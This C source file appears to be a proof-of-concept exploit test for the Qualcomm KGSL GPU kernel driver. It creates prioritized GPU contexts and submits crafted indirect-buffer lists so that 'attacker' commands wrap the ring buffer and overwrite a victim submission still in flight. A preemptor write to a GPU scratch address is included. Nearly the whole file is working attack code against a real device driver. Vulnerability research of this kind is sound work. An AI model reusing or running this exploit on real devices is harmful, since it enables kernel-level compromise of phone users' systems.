/*
 * kgsl_overwrite_test.c - S3.3: rb3 allocspace wrap-overwrite demonstration.
 *
 * Sequence (all on rb3):
 *   f1(1330 craft) f2(33) f3(1330) f4(25)   -> normalises _wptr (wrap x2)
 *   victim: [work IB: 200k MEM_WRITEs][marker IB: OUT[9]=0xV1]  -> wraps to 0
 *   spacer(1330)                            -> advances _wptr near end
 *   [FULL only] preemptor (rb0): scratch+12 = V ; OUT[11]=0xF4K3
 *   [FULL only] attacker(100): wraps to 0 -> overwrites victim content
 * Expect: control -> OUT[9]=0xV1 ; full -> OUT[9]==0 && OUT[8]==0xA1
 *
 * Build control: zig cc ... -o kgsl_overwrite_ctrl kgsl_overwrite_test.c
 * Build full:    zig cc -DFULL ... -o kgsl_overwrite_test kgsl_overwrite_test.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_exit 93
#define SYS_close 57
#define SYS_mmap 222
#define SYS_sched_yield 124
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static inline s64 sys6(long n,s64 a,s64 b,s64 c,s64 d,s64 e,s64 f){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x4 __asm__("x4")=e;register s64 x5 __asm__("x5")=f;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_drawctxt_create{u32 flags;u32 drawctxt_id;};
#define IOCTL_DRAWCTXT_CREATE IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x13,sizeof(struct kgsl_drawctxt_create))
struct kgsl_gpumem_alloc_id{u32 id;u32 flags;u64 size;u64 mmapsize;u64 gpuaddr;u64 pad[2];};
#define IOCTL_GPUMEM_ALLOC_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x34,sizeof(struct kgsl_gpumem_alloc_id))
struct kgsl_command_object{u64 offset;u64 gpuaddr;u64 size;u32 flags;u32 id;};
struct kgsl_gpu_command{u64 flags;u64 cmdlist;u32 cmdsize;u32 numcmds;u64 objlist;u32 objsize;u32 numobjs;u64 synclist;u32 syncsize;u32 numsyncs;u32 context_id;u32 timestamp;};
#define IOCTL_GPU_COMMAND IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x4A,sizeof(struct kgsl_gpu_command))
#define KGSL_CMDLIST_IB 0x1u
#define CP_MEM_WRITE 0x3du
#define CP_NOP 0x10u

static u32 parity(u32 v){v^=v>>4;v^=v>>8;v^=v>>12;v^=v>>16;v^=v>>20;v^=v>>24;v^=v>>28;return (0x9669u>>(v&0xf))&1u;}
static u32 pkt7(u32 op,u32 cnt){return 0x70000000u|(cnt&0x3fffu)|(parity(cnt)<<15)|((op&0x7fu)<<16)|(parity(op)<<23);}
static void dc_civac(void*p,u64 len){u64 a=(u64)p&~63ull,b=((u64)p+len+63)&~63ull;for(;a<b;a+=64)asm volatile("dc civac, %0"::"r"(a):"memory");asm volatile("dsb ish":::"memory");}

static long gfd; static u32 gv, gp; static u32*outp; static u64 out_gpu;
static u32*big; static u64 big_gpu; static u32 bigid;
static u64 entry_off = 0;   /* where filler IB entries point inside big */
static struct kgsl_command_object cobjs[1400];
static long submit_ib_list(u32 ctx,u32 cmdid,u64 cmd_gpu_default,u32 ts,u32 n, u32 maxdwords, u32 extra_work, u64 work_gpu, u32 work_dw, u64 marker_gpu){
    /* builds n IB entries: [work][fillers...][marker(last)] */
    u32 idx=0;
    if(extra_work){ cobjs[idx].offset=0; cobjs[idx].gpuaddr=work_gpu; cobjs[idx].size=work_dw*4; cobjs[idx].flags=KGSL_CMDLIST_IB; cobjs[idx].id=0; idx++; }
    u32 limit = marker_gpu ? (n-1) : n;
    for(;idx<limit;idx++){
        cobjs[idx].offset=0; cobjs[idx].gpuaddr=big_gpu + entry_off; cobjs[idx].size=16;
        cobjs[idx].flags=KGSL_CMDLIST_IB; cobjs[idx].id=bigid;
    }
    if(marker_gpu){ cobjs[idx].offset=0; cobjs[idx].gpuaddr=marker_gpu; cobjs[idx].size=16; cobjs[idx].flags=KGSL_CMDLIST_IB; cobjs[idx].id=0; idx++; }
    (void)cmdid;(void)cmd_gpu_default;(void)maxdwords;
    struct kgsl_gpu_command gc; for(u64 i=0;i<sizeof(gc);i++)((u8*)&gc)[i]=0;
    gc.cmdlist=(u64)cobjs; gc.cmdsize=sizeof(struct kgsl_command_object); gc.numcmds=n;
    gc.context_id=ctx; gc.timestamp=ts;
    return sys3(SYS_ioctl,gfd,IOCTL_GPU_COMMAND,(s64)&gc);
}
static long alloc_buf(u64 size,u32*id,u64*gpu,u32**cpu){
    struct kgsl_gpumem_alloc_id a; for(u64 i=0;i<sizeof(a);i++)((u8*)&a)[i]=0;
    a.size=size;
    long r=sys3(SYS_ioctl,gfd,IOCTL_GPUMEM_ALLOC_ID,(s64)&a);
    if(r) return r;
    *id=a.id; *gpu=a.gpuaddr; u64 mz=a.mmapsize?a.mmapsize:size;
    s64 m=sys6(SYS_mmap,0,mz,3,1,gfd,(s64)((u64)a.id<<12));
    if(m<=0) return -1;
    *cpu=(u32*)m; return 0;
}
void _start(void){
#ifdef FULL
    out("[*] kgsl_overwrite_test FULL\n");
#else
    out("[*] kgsl_overwrite_test CONTROL\n");
#endif
    gfd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
    if(gfd<0){out("[!] open\n");sys3(SYS_exit,1,0,0);return;}
    struct kgsl_drawctxt_create d; d.flags=0xC012u; d.drawctxt_id=0; /* prio 12 -> rb3 */
    if(sys3(SYS_ioctl,gfd,IOCTL_DRAWCTXT_CREATE,(s64)&d)){out("[!] ctx v\n");sys3(SYS_exit,1,0,0);return;} gv=d.drawctxt_id;
    d.flags=0x1012u; d.drawctxt_id=0; /* prio 1 -> rb0 */
    if(sys3(SYS_ioctl,gfd,IOCTL_DRAWCTXT_CREATE,(s64)&d)){out("[!] ctx p\n");sys3(SYS_exit,1,0,0);return;} gp=d.drawctxt_id;
    out("[1] victim/atk ctx(rb3)=");outdec(gv);out(" preemptor ctx(rb0)=");outdec(gp);out("\n");

    if(alloc_buf(0x10000,&bigid,&big_gpu,&big)){out("[!] big\n");sys3(SYS_exit,1,0,0);return;}
    u32 oid; if(alloc_buf(0x1000,&oid,&out_gpu,&outp)){out("[!] out\n");sys3(SYS_exit,1,0,0);return;}
    /* big buffer: slices of 16B: NOP(3) filler; slice0 = MEM_WRITE OUT[8]=0xA1 */
    for(u32 i=0;i<4096;i+=4){
        u32 *s=big+i;
        if(i==0){ s[0]=pkt7(CP_MEM_WRITE,3); s[1]=(u32)(out_gpu+32); s[2]=(u32)((out_gpu+32)>>32); s[3]=0xA1; }
        else if(i==0x800/4){ s[0]=pkt7(CP_MEM_WRITE,3); s[1]=(u32)(out_gpu+36); s[2]=(u32)((out_gpu+36)>>32); s[3]=0xAA; }
        else { s[0]=pkt7(CP_NOP,3); s[1]=0; s[2]=0; s[3]=0; }
    }
    dc_civac(big,0x4000);
    u32 wid; u64 wgpu; u32*work;
    if(alloc_buf(0x1000+200000*16,&wid,&wgpu,&work)){out("[!] work\n");sys3(SYS_exit,1,0,0);return;}
    u32 mid; u64 mgpu; u32*mc;
    if(alloc_buf(0x1000,&mid,&mgpu,&mc)){out("[!] mark\n");sys3(SYS_exit,1,0,0);return;}
    u32 pcmd_id; u64 pcg; u32*pc;
    if(alloc_buf(0x1000,&pcmd_id,&pcg,&pc)){out("[!] pcmd\n");sys3(SYS_exit,1,0,0);return;}
    /* work IB: 200k MEM_WRITEs OUT[64+i]=i ; first op writes OUT[10]=0x5741 (start) */
    u32 k=0;
    work[k++]=pkt7(CP_MEM_WRITE,3); work[k++]=(u32)(out_gpu+40); work[k++]=(u32)((out_gpu+40)>>32); work[k++]=0x5741;
    for(u32 i=0;i<200000;i++){ work[k++]=pkt7(CP_MEM_WRITE,3); work[k++]=(u32)(out_gpu+256+i*4); work[k++]=(u32)((out_gpu+256+i*4)>>32); work[k++]=i+1; }
    work[k++]=pkt7(CP_MEM_WRITE,3); work[k++]=(u32)(out_gpu+48); work[k++]=(u32)((out_gpu+48)>>32); work[k++]=0xD0D0;
    dc_civac(work,k*4);
    /* marker IB: OUT[9]=0x11 (offset 36) */
    mc[0]=pkt7(CP_MEM_WRITE,3); mc[1]=(u32)(out_gpu+36); mc[2]=(u32)((out_gpu+36)>>32); mc[3]=0x11;
    dc_civac(mc,16);
    /* preemptor cmd: scratch+12 = V, OUT[11]=0xF4K3 (offset 44) */
    u64 SCR12=0xf8009000ull+12;

    outp[8]=0; outp[9]=0; outp[10]=0; outp[11]=0; dc_civac(outp,64);

    /* fillers f1..f4 */
    u32 ts=200;
    long r;
    r=submit_ib_list(gv,0,0,ts++,1330,0,0,0,0,0); out("[2] f1 ret=");outdec(r);out("\n");
    r=submit_ib_list(gv,0,0,ts++,33,0,0,0,0,0);   out("[3] f2 ret=");outdec(r);out("\n");
    r=submit_ib_list(gv,0,0,ts++,1330,0,0,0,0,0); out("[4] f3 ret=");outdec(r);out("\n");
    r=submit_ib_list(gv,0,0,ts++,25,0,0,0,0,0);   out("[5] f4 ret=");outdec(r);out("\n");
    /* victim: 300 entries: work IB + fillers + marker last (past CP prefetch) */
    r=submit_ib_list(gv,0,0,ts++,300,0,1,wgpu,k,mgpu);
    out("[6] victim ret=");outdec(r);out("\n");
    /* wait for long IB to start */
    int started=0; for(int i=0;i<400000;i++){ dc_civac(outp,64); if(outp[10]==0x5741){started=1;break;} sys3(SYS_sched_yield,0,0,0); }
    out("[7] victim started -> ");out(started?"yes\n":"no\n");
    /* spacer */
    r=submit_ib_list(gv,0,0,ts++,1030,0,0,0,0,0); out("[8] spacer ret=");outdec(r);out("\n");
#ifdef FULL
    /* preemptor: scratch+12 = V ; marker OUT[11] */
    k=0; pc[k++]=pkt7(CP_MEM_WRITE,3); pc[k++]=(u32)SCR12; pc[k++]=(u32)(SCR12>>32); pc[k++]=0x1FFF;
    pc[k++]=pkt7(CP_MEM_WRITE,3); pc[k++]=(u32)(out_gpu+44); pc[k++]=(u32)((out_gpu+44)>>32); pc[k++]=0xF4C3;
    dc_civac(pc,k*4);
    /* raw submit preemptor IB on rb0 */
    {
        struct kgsl_command_object co; co.offset=0; co.gpuaddr=pcg; co.size=k*4; co.flags=KGSL_CMDLIST_IB; co.id=pcmd_id;
        struct kgsl_gpu_command gc; for(u64 i=0;i<sizeof(gc);i++)((u8*)&gc)[i]=0;
        gc.cmdlist=(u64)&co; gc.cmdsize=sizeof(co); gc.numcmds=1; gc.context_id=gp; gc.timestamp=ts++;
        r=sys3(SYS_ioctl,gfd,IOCTL_GPU_COMMAND,(s64)&gc);
    }
    out("[9] preemptor ret=");outdec(r);out("\n");
    int pre=0; for(int i=0;i<400000;i++){ dc_civac(outp,64); if(outp[11]==0xF4C3){pre=1;break;} sys3(SYS_sched_yield,0,0,0); }
    out("[10] preemptor executed -> ");out(pre?"yes\n":"no\n");
    /* attacker: 360 entries wrapping to 0 (covers victim padding; OUT[9]=0xAA slice) */
    entry_off = 0x800;
    r=submit_ib_list(gv,0,0,ts++,360,0,0,0,0,0);
    entry_off = 0;
    out("[11] attacker ret=");outdec(r);out(r?" (ENOSPC = safe retry needed)\n":" (wrap accepted)\n");
#endif
    /* wait for victim long IB to finish (OUT[12] = 0xD0D0 end marker) */
    int fin=0; for(int i=0;i<8000000;i++){ dc_civac(outp,64); if(outp[12]==0xD0D0u){fin=1;break;} sys3(SYS_sched_yield,0,0,0); }
    out("[11b] victim finished -> ");out(fin?"yes\n":"timeout\n");
    dc_civac(outp,256+64);
    out("[12] OUT[8]=");outhex(outp[8]);out(" OUT[9]=");outhex(outp[9]);out(" OUT[10]=");outhex(outp[10]);out(" OUT[11]=");outhex(outp[11]);out("\n");
    out("[13] victim marker OUT[9]: "); out(outp[9]==0x11?"PRESENT (no overwrite)\n":"ABSENT (overwritten?)\n");
#ifdef FULL
    out("[14] attacker marker OUT[8]: "); out(outp[8]==0xA1?"EXECUTED (attacker IBs ran)\n":"not executed\n");
#endif
    out("[*] done\n");
    sys3(SYS_close,gfd,0,0);
    sys3(SYS_exit,0,0,0);
}
